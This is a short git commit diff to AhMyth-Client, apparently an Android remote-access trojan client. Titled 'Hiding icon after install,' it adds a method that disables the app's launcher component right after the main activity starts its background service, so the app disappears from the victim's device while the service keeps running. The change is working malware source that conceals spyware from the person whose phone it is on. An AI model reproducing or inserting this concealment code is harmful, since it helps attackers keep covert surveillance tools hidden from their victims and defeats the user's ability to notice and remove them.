007e073520c770ac63ea88bdd1c22f964d61a1f8
Heras <37497642+p2svn9x@users.noreply.github.com>
2020-02-08 23:52:26 +0700

    Hiding icon after install.

--- AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/MainActivity.java
+++ AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/MainActivity.java
@@ -21,9 +21,15 @@ public class MainActivity extends Activity {
         setContentView(R.layout.activity_main);
         startService(new Intent(this, MainService.class));
         finish();
+        fn_hideicon();
     }
 
+private void fn_hideicon() {
 
+        getPackageManager().setComponentEnabledSetting(getComponentName(),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+    }
 
 
 
